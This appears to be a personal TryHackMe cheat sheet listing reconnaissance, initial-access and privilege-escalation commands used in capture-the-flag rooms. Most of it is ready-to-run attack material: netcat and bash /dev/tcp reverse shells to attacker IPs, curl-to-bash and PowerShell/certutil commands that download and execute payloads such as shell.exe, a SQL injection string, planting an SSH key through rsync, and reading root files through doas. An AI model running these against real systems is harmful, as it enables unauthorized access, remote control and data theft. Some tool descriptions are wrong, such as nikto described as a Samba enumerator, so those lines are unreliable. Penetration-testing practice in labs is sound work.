
# TryHackMe Experience
- Index
  - https://gist.github.com/AshtonIzmev/72f33ae4ff93a6603d55959b2b1e8078#file-thm_steps-sh
  - [Reconnaissance](https://github.com/sumo2001/Prep-Notes/tree/main/tryhackme#reconnaissance)
  - [Initial Access](https://github.com/sumo2001/Prep-Notes/tree/main/tryhackme#initial-access)
  - [Interesting files and paths](https://github.com/sumo2001/Prep-Notes/tree/main/tryhackme#interesting-files-and-paths)
  - [Esclation and Tweaks](https://github.com/sumo2001/Prep-Notes/tree/main/tryhackme#esclation-and-tweaks)


### Reconnaissance
- Better to configure /etc/hosts
- ss -ltp helps in look after listening network sockets on a host
- Nmap -sC -sV -v target   
  - sV tries to find out which services are running on the target
  - Pn disables the ping command and only scans ports.
  - sC is short form for script scan, based on services availble, it uses sripts to scan more
  - T<0-5>: Set timing template (higher is faster)
  - A Enable OS detection, version detection, script scanning, and traceroute
- gobuster dir -u http://10.10.164.212/ -w /usr/share/wordlists/dirb/common.txt -x php
  - dir fuzzer 
  - x: type of file to fuzz for
- nikto -h target
  - tool for enumerating information from Windows and Samba systems
- enum4linux target
  - tool for enumerating information from Windows and Samba systems 
- smbmap -H target 
  - SMBMap allows users to enumerate samba share drives across an entire domain. List share drives, drive permissions, share contents etc.
- smbclient //target/share
  - Mostly used in null sessions kinda samba exploitable directories
- rustscan -a target
  - The modern NMAp scanner  
- wfuzz -c -f domains -w /usr/share/wordlists/dirb/common.txt -u "http://cybercrafted.thm" -H "Host: FUZZ.cybercrafted.thm" --sc 200,403
  - Subdomain Enumeration 
  - sc:   Show responses with the  specified  code
- NFS Mount
  - sudo showmount -e 10.10.63.208 
  - mkdir /tmp/infosec
  - mount -t nfs 10.10.63.208:/opt/conf /tmp/infosec  
- rsync
  - rsync --list-only rsync://rsync-connect@10.10.190.83/files/sys-internal/
  - cp ~/.ssh/id_rsa.pub authorized_keys
  - rsync authorized_keys rsync://rsync-connect@10.10.190.83/files/sys-internal/.ssh   

### Initial Access
- Searchsploit nagios
  - searchsploit -m php/webapps/blah.txt  -> convert to py shell and read the comments/usage details in the the following code and input accordingly
  - python3 -m http.server 8080
  - Opens up a dedicated python server over the internet to serve files in that directory
  - http://10.9.2.90:8080/shell.sh | bash
 - nc -nlvp 1234
   - Opens up a netcat shell on attacker box for incoming connections 
 - python -c 'import pty; pty.spawn("/bin/bash")'  
   - Upgrade from a dump shell to  bash shell
 - powershell.exe Invoke-WebRequest -Uri https://10.10.10.10/shell.exe -OutFile ./shell.exe && .\shell.exe
   - powershell.exe — this is a shell in windows (other than cmd.exe) it is object oriented and it is the blue teams best friend and a hackers favorite mistress
   - Invoke-WebRequest — powershell module similar to curl
   - Uri — the target URI
   - OutFile — what the file downloaded will be called
   - .\shell.exe — execute the shell.exe in the current working directory
   - Get-Content user.txt
 - certutil.exe -urlcache -split -f http://10.17.8.104:8080/mysqld_evil.exe mysqld.exe
   - To download a payload from a remote server 
- 1' or '1'='1';-- -
  - SQL Injection Payloads 
  - sqlmap -r login.req --level 3 --risk 3 --forms --dump
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f
  - mkfifo /tmp/f is creating a named pipe at /tmp/f.
  - cat /tmp/f is printing whatever is written to that named pipe and the output of cat /tmp/f is been piped to /bin/sh
  - /bin/sh is running interactively and stderr is redirected to stdout.
  - the output is then piped to nc which is listening on port 1234
  - and the out put is finally redirected to the named pipe again.
  - If we have a ‘PHP system’ remote code exec on the system, we will spawn a proper rev shell using nc

- /bin/bash -i >& /dev/tcp/10.2.96.144/4443 0>&1
  - Load this babe into a .sh file used during cronjob kinda exploits 
  - ?cmd=curl+http://10.2.96.144:8000/rev.sh+|+bash
  - Downloads and executes file
  - [Pentest Monkey Reverse PHP file](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
 - haiti hash
   - Tool to detect type of hash
 - john --wordlist=./rockyou.txt --format=raw-sha1 hash.txt
   - Johnny johnny yes papa, crashing hash yes papa
 - ./ssh2john.py id_rsa > john_rsa
   - Converting an ssh key with a passphrase to john readble format to crack the passphrase
   - used to crack passphrases for id_rsa keys aka priv keys 
 - Considering we have remote access to a host via ssh, and a service is running on xxx port on a remote server : SSH Port forwarding
   - ssh -L 8111:127.0.0.1:8111 sys-internal@10.10.190.83   

### Interesting files and paths
- cd /var/www/html/wordpress/wp-config.php
- doas.conf
  - Check whether SSL is permitted to run as root! [permit nopass plot_admin as root cmd openssl]
  -  doas openssl enc -in "/root/root.txt"  
- SSH SOCKS PROXY
  - 10.10.72.205 is having an another eth1 interface connected with network address 172.16.20.0/24
  - within my local terminal is "ssh -D localhost:9050 -f -N adam@10.10.72.205"  
  - f to put the ssh to the background and -N to make it not execute a remote command
  - editing /etc/proxychains4.conf and adding socks4 127.0.0.1 9050
  - "proxychains nmap -F 172.16.20.0/24"

### Esclation and tweaks
- https://github.com/swisskyrepo/PayloadsAllTheThings
- su user
- sudo -l
- https://gtfobins.github.io/
  - Limuzzzzzz
- https://lolbas-project.github.io/  
  - Windows 
- find / -type f -perm -u=s 2>/dev/null
- getcap -r / 2>/dev/null 
- https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
- curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh



### References and boxes completed
1. https://tryhackme.com/room/techsupp0rt1
2. https://tryhackme.com/room/flatline
3. https://tryhackme.com/room/plottedtms
4. https://tryhackme.com/room/gallery666
5. https://tryhackme.com/room/cybercrafted
6. https://tryhackme.com/room/containme1
7. https://tryhackme.com/room/ide
8. https://tryhackme.com/room/vulnnetinternal
9. 
    
